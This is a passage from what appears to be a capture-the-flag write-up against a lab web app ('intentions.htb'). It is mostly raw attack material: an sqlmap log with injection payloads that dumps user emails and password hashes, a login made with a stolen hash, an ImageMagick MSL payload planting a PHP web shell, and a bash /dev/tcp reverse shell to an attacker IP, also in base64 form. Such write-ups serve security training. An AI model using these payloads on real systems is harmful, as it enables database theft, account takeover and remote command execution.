[11:12:47] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[11:12:56] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[11:12:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[11:12:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[11:12:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[11:12:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[11:12:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[11:12:58] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[11:12:58] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[11:12:59] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[11:12:59] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:13:00] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:13:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:13:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:13:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[11:13:01] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[11:13:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:13:02] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[11:13:02] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[11:13:04] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[11:13:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[11:13:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[11:13:04] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[11:13:04] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[11:13:04] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[11:13:04] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[11:13:04] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[11:13:04] [INFO] testing 'Generic inline queries'
[11:13:04] [INFO] testing 'MySQL inline queries'
[11:13:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[11:13:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[11:13:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[11:13:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[11:13:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[11:13:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[11:13:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:13:19] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[11:13:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:13:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:13:29] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[11:13:38] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[11:13:45] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[11:13:53] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[11:14:01] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[11:14:09] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[11:14:17] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[11:14:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[11:14:33] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[11:14:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[11:14:55] [INFO] target URL appears to be UNION injectable with 5 columns
[11:14:57] [INFO] (custom) POST parameter 'JSON #1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"nature') AND 1939=1939 AND ('gaoI'='gaoI"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"nature') AND (SELECT 9467 FROM (SELECT(SLEEP(5)))FuqD) AND ('UcoS'='UcoS"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"nature') UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a7871,0x6b634e7a4a625773554a4f7a764b68474d6b65775a65796d71456d4278426b77707a5677764e5763,0x71766a6a71),NULL,NULL#"}
---
[11:14:57] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[11:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:14:58] [INFO] fetching columns for table 'users' in database 'intentions'
[11:14:58] [INFO] fetching entries for table 'users' in database 'intentions'
[11:14:59] [WARNING] reflective value(s) found and filtering out
Database: intentions
Table: users
[28 entries]
+----+-------------------------------+--------------------------+----------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| id | email                         | name                     | genres                           | admin   | password                                                     | created_at          | updated_at          |
+----+-------------------------------+--------------------------+----------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| 1  | steve@intentions.htb          | steve                    | food,travel,nature               | 1       | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2  | greg@intentions.htb           | greg                     | food,travel,nature               | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
| 3  | hettie.rutherford@example.org | Melisa Runolfsson        | food,travel,nature               | 0       | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 4  | nader.alva@example.org        | Camren Ullrich           | food,travel,nature               | 0       | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 5  | jones.laury@example.com       | Mr. Lucius Towne I       | food,travel,nature               | 0       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 6  | wanda93@example.org           | Jasen Mosciski           | food,travel,nature               | 0       | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 7  | mwisoky@example.org           | Monique D'Amore          | food,travel,nature               | 0       | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 8  | lura.zieme@example.org        | Desmond Greenfelder      | food,travel,nature               | 0       | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 9  | pouros.marcus@example.net     | Mrs. Roxanne Raynor      | food,travel,nature               | 0       | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 10 | mellie.okon@example.com       | Rose Rutherford          | food,travel,nature               | 0       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 11 | trace94@example.net           | Dr. Chelsie Greenholt I  | food,travel,nature               | 0       | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 12 | kayleigh18@example.com        | Prof. Johanna Ullrich MD | food,travel,nature               | 0       | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 13 | tdach@example.com             | Prof. Gina Brekke        | food,travel,nature               | 0       | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 14 | lindsey.muller@example.org    | Jarrett Bayer            | food,travel,nature               | 0       | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 15 | tschmidt@example.org          | Macy Walter              | food,travel,nature               | 0       | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 16 | murray.marilie@example.com    | Prof. Devan Ortiz DDS    | food,travel,nature               | 0       | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 17 | barbara.goodwin@example.com   | Eula Shields             | food,travel,nature               | 0       | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 18 | maggio.lonny@example.org      | Mariano Corwin           | food,travel,nature               | 0       | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 19 | chackett@example.org          | Madisyn Reinger DDS      | food,travel,nature               | 0       | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 20 | layla.swift@example.net       | Jayson Strosin           | food,travel,nature               | 0       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 21 | rshanahan@example.net         | Zelda Jenkins            | food,travel,nature               | 0       | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 22 | shyatt@example.com            | Eugene Okuneva I         | food,travel,nature               | 0       | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 23 | sierra.russel@example.com     | Mrs. Rhianna Hahn DDS    | food,travel,nature               | 0       | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 24 | ferry.erling@example.com      | Viola Vandervort DVM     | food,travel,nature               | 0       | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 25 | beryl68@example.org           | Prof. Margret Von Jr.    | food,travel,nature               | 0       | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 26 | ellie.moore@example.net       | Florence Crona           | food,travel,nature               | 0       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 27 | littel.blair@example.org      | Tod Casper               | food,travel,nature               | 0       | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 28 | foobar@foobar.local           | foobar                   | nature')/**/__REFLECTED_VALUE__# | 0       | $2y$10$aD1iNXBOIagLPGUd0krGr.36WxlCjI5mY49sd8giwfJPysSvWkl1i | 2023-07-05 09:03:09 | 2023-07-05 09:14:59 |
+----+-------------------------------+--------------------------+----------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+

[11:14:59] [INFO] table 'intentions.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/10.129.148.165/dump/intentions/users.csv'
[11:14:59] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 271 times
[11:14:59] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.129.148.165'

[*] ending @ 11:14:59 /2023-07-05/
```

```c
$ cat /home/user/.local/share/sqlmap/output/10.129.148.165/dump/intentions/users.csv | grep -e steve -e greg | cut -d, -f2,8
steve@intentions.htb,$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg@intentions.htb,$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

We didn't managed to crack the hashes so we logged out and logged back in again, but this time we changed the `API` from `v1` to `v2` and
used the hash for authentication.

Request:

```c
POST /api/v2/auth/login HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IjNzaHF5cFhsWEtRbEQySnFJVExwa3c9PSIsInZhbHVlIjoiVk45QThZUFhRZ2t1WlRUOGtDaC93akdKM0FveElJOEpsTjduK3RPVEpJN3BFbk14aXZWaGE1OTdUYklQWUgvSVB2NXlXdVRsMGdMZXdiV2ZxZUlHdDdWaEJjMVIxQjVpUy9WUUQ4R2tRUk5hY0JXYU5kdXFiU1B6MzVFbXFadUEiLCJtYWMiOiIyY2Y4ZmU0YmZmZmZiNzFiODY2OWNhMWQ3MTY0NWFjNzJlNTg4YjY2MzQ2OWRmNDczZmQwYmU5ZThhMjkyNzI3IiwidGFnIjoiIn0=
Content-Length: 52
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/
Cookie: XSRF-TOKEN=eyJpdiI6IjNzaHF5cFhsWEtRbEQySnFJVExwa3c9PSIsInZhbHVlIjoiVk45QThZUFhRZ2t1WlRUOGtDaC93akdKM0FveElJOEpsTjduK3RPVEpJN3BFbk14aXZWaGE1OTdUYklQWUgvSVB2NXlXdVRsMGdMZXdiV2ZxZUlHdDdWaEJjMVIxQjVpUy9WUUQ4R2tRUk5hY0JXYU5kdXFiU1B6MzVFbXFadUEiLCJtYWMiOiIyY2Y4ZmU0YmZmZmZiNzFiODY2OWNhMWQ3MTY0NWFjNzJlNTg4YjY2MzQ2OWRmNDczZmQwYmU5ZThhMjkyNzI3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImxLaTNiWm5rY0VQTW54T2NUZ0lla3c9PSIsInZhbHVlIjoib2JSQWZJUTBRS0ZaeFNRYnBURUh0TmUxVlM0bkV5SmNpdnU3VzNycC9vMGJYM0tqaVVXY1dIU3dSRHExREVsRWJKeDNIblVrUldDN0RZL1JMSkRYVjRxOUtCRDd4YXc0ampRRXBIUkFWTlRFYmlHaHYzcjErSkVlbW52RndOQjEiLCJtYWMiOiJlYmViZmIzZmRmNTliYjgzYTc5OGQ4Y2ExMGEzOTVmMWY1MDhhMWE1OGI0YzcwOTM3MTQzMzNmOTYyYTE1MjI5IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NDc4MjUsImV4cCI6MTY4ODU2OTQyNSwibmJmIjoxNjg4NTQ3ODI1LCJqdGkiOiJOOEhVME1xS2p6VzlrNmNoIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.x0L1XeQB1vOw5Z2DCpqQy1VvgK6oBNmQKivH1fQmWmY

{"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
```

After a successful login, we were able to switch to `/admin` by simply changing the url.

> http://10.129.148.165/admin

As admin we could edit the image files.

> http://10.129.148.165/admin#/image/1

Request:

```c
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InNWdGJxTWtkMWJydlR3MGZtRkFWM2c9PSIsInZhbHVlIjoidUFNNDFremlkdjV3Y3dBQ1hheThWMk5GVklpb2IxOVh3bGQ4d3pycmgwUDlnbWFsaDB5b1JZVkhXR0JwZWR1K1lRYSs4L3c1TXRRTzk1VC9rc3c2WTZiNzdsa09rd0RFZEV4eEFmNCtJNTBkV1hhNjN5T3ZRQzZtNDZ0WFJJVS8iLCJtYWMiOiI3M2I0YTViZTA0N2I0MzlhOGJiYzY5OTg3OWNkODg1NjdjMjhkN2U2YWU1Y2I3ODhmZTVhZjY1MDAyYTJjMTAyIiwidGFnIjoiIn0=
Content-Length: 116
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/admin
Cookie: XSRF-TOKEN=eyJpdiI6InNWdGJxTWtkMWJydlR3MGZtRkFWM2c9PSIsInZhbHVlIjoidUFNNDFremlkdjV3Y3dBQ1hheThWMk5GVklpb2IxOVh3bGQ4d3pycmgwUDlnbWFsaDB5b1JZVkhXR0JwZWR1K1lRYSs4L3c1TXRRTzk1VC9rc3c2WTZiNzdsa09rd0RFZEV4eEFmNCtJNTBkV1hhNjN5T3ZRQzZtNDZ0WFJJVS8iLCJtYWMiOiI3M2I0YTViZTA0N2I0MzlhOGJiYzY5OTg3OWNkODg1NjdjMjhkN2U2YWU1Y2I3ODhmZTVhZjY1MDAyYTJjMTAyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InNheTByUXVsdEw3SUMxcW9La3kvL2c9PSIsInZhbHVlIjoiRDhMQlZ1OXhWNXpQMmZseUtzeUM4cjNKUWpoNnR4NHFuU0F0dGpRRXJNaFQ1WTIxUXZEbC9OMW03M3FMNzFBeUVYRjkrRFRsdXBWVkNJK0hzdElyQjZoMHY3TFRBdFNKVUYzeStuN2lUbzV2Y0xmcWZNeDVjdFJSQ21abzJ3bGMiLCJtYWMiOiI2OTc0OWU5ODEyNmUwMmZlMzRiNmFkOTBjYmFmNzQ2YjNmMjYzZDk3ZjFmMWRlZWVmMDE3MTkxMzBjOTZkODMxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NTEyMDYsImV4cCI6MTY4ODU3MjgwNiwibmJmIjoxNjg4NTUxMjA2LCJqdGkiOiJqcGE3VGx1V0FUYm5xTVFOIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ._Lgs-Lgv-VQLYTFRpCqlizd6NVPZSPkKO93PNlvaNO0

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}
```

We find the full file path this way.

### Remote Code Execution (RCE)

> https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

Payload:

```c
--foobar
Content-Disposition: form-data; name="foobar"; filename="foobar.msl"
Content-Type: text/plain



<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php system(\$_GET['cmd']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/foobar.php" />
</image>
--foobar--
```

Request:

```c
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InNWdGJxTWtkMWJydlR3MGZtRkFWM2c9PSIsInZhbHVlIjoidUFNNDFremlkdjV3Y3dBQ1hheThWMk5GVklpb2IxOVh3bGQ4d3pycmgwUDlnbWFsaDB5b1JZVkhXR0JwZWR1K1lRYSs4L3c1TXRRTzk1VC9rc3c2WTZiNzdsa09rd0RFZEV4eEFmNCtJNTBkV1hhNjN5T3ZRQzZtNDZ0WFJJVS8iLCJtYWMiOiI3M2I0YTViZTA0N2I0MzlhOGJiYzY5OTg3OWNkODg1NjdjMjhkN2U2YWU1Y2I3ODhmZTVhZjY1MDAyYTJjMTAyIiwidGFnIjoiIn0=
Content-Length: 116
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/admin
Cookie: XSRF-TOKEN=eyJpdiI6InNWdGJxTWtkMWJydlR3MGZtRkFWM2c9PSIsInZhbHVlIjoidUFNNDFremlkdjV3Y3dBQ1hheThWMk5GVklpb2IxOVh3bGQ4d3pycmgwUDlnbWFsaDB5b1JZVkhXR0JwZWR1K1lRYSs4L3c1TXRRTzk1VC9rc3c2WTZiNzdsa09rd0RFZEV4eEFmNCtJNTBkV1hhNjN5T3ZRQzZtNDZ0WFJJVS8iLCJtYWMiOiI3M2I0YTViZTA0N2I0MzlhOGJiYzY5OTg3OWNkODg1NjdjMjhkN2U2YWU1Y2I3ODhmZTVhZjY1MDAyYTJjMTAyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InNheTByUXVsdEw3SUMxcW9La3kvL2c9PSIsInZhbHVlIjoiRDhMQlZ1OXhWNXpQMmZseUtzeUM4cjNKUWpoNnR4NHFuU0F0dGpRRXJNaFQ1WTIxUXZEbC9OMW03M3FMNzFBeUVYRjkrRFRsdXBWVkNJK0hzdElyQjZoMHY3TFRBdFNKVUYzeStuN2lUbzV2Y0xmcWZNeDVjdFJSQ21abzJ3bGMiLCJtYWMiOiI2OTc0OWU5ODEyNmUwMmZlMzRiNmFkOTBjYmFmNzQ2YjNmMjYzZDk3ZjFmMWRlZWVmMDE3MTkxMzBjOTZkODMxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NTEyMDYsImV4cCI6MTY4ODU3MjgwNiwibmJmIjoxNjg4NTUxMjA2LCJqdGkiOiJqcGE3VGx1V0FUYm5xTVFOIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ._Lgs-Lgv-VQLYTFRpCqlizd6NVPZSPkKO93PNlvaNO0

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}
```

Modified Request:

```c
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=sepia HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=ABC
X-XSRF-TOKEN: eyJpdiI6IktKQStRTHA3MVlGUlFwTUVyeVVMVnc9PSIsInZhbHVlIjoiZFhWMEhJT0dKbHhUY0plNUZsVEdoZ055ajhOSlp0TENsWG0wQW1GcUFkbXdzbzZSc2NmQ1RqTDVjbnRqeXBHVHo3ZTVQS0F6SG1CTXBFQVdGQldkQjdTOHJwcnZQZCtBR0JmdFRpMXp0Y3YzalBIM0xpc1pkN0QyWWdPNXJCNkMiLCJtYWMiOiI0Yzk3NDZiZDk5NWZlMjkwMDA3ZWY1YTliNDM3ODQ1MzgwYzczNGEzYzdkOWU0MjE1ZjNiYTk1M2VmMjVhN2Y0IiwidGFnIjoiIn0=
Content-Length: 116
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/admin
Cookie: XSRF-TOKEN=eyJpdiI6IktKQStRTHA3MVlGUlFwTUVyeVVMVnc9PSIsInZhbHVlIjoiZFhWMEhJT0dKbHhUY0plNUZsVEdoZ055ajhOSlp0TENsWG0wQW1GcUFkbXdzbzZSc2NmQ1RqTDVjbnRqeXBHVHo3ZTVQS0F6SG1CTXBFQVdGQldkQjdTOHJwcnZQZCtBR0JmdFRpMXp0Y3YzalBIM0xpc1pkN0QyWWdPNXJCNkMiLCJtYWMiOiI0Yzk3NDZiZDk5NWZlMjkwMDA3ZWY1YTliNDM3ODQ1MzgwYzczNGEzYzdkOWU0MjE1ZjNiYTk1M2VmMjVhN2Y0IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InhYV3BGbXhUREFHWStlRFNIbHZMUWc9PSIsInZhbHVlIjoiSkQvVk1UZk90bHVwelhjWnZHYklTVWRSSE82WERDdklEMll1VGUzbUFUN0NHU1ZSd3NzTVdlY1Qwc0FNNjJSWVZRNnFRaTlQWC92Z3NMdmJwbFhJTG1tcE9KOTNnL0JhaTJNcmRudmJTVHlJUCswUW1INWxxaUJOSVJFVVV3RFYiLCJtYWMiOiJjYzI5OTU3ZDFiOTBkMmI5MmU1NGYyOGM4NjA3YWRiMjUzYzMwZDYwNzM5ZjE0ZTVjZTM0ZTg5NGU5NmUyYjM1IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NjQxMzEsImV4cCI6MTY4ODU4NTczMSwibmJmIjoxNjg4NTY0MTMxLCJqdGkiOiJzMEpqSWJEZUN1MlEyUW82Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.eUhHAQGLGS3MUycoboxANWWL5mcLjBYkVT38iTnFlKg


--ABC
Content-Disposition: form-data; name="test"; filename="test.msl"
Content-Type: text/plain


<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php system(\$_GET['cmd']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/a.php" />
</image>
--ABC--
```

> http://10.129.148.165/storage/a.php?cmd=id

### Reverse Shell

Payload:

```c
/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.15/9001 0>&1'
```

```c
$ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.15/9001 0>&1'" | base64
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE1LzkwMDEgMD4mMScK
```

Encoded Payload:

```c
echo%20L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE1LzkwMDEgMD4mMScK%20%7c%20base64%20%2dd%20%7c%20bash
```

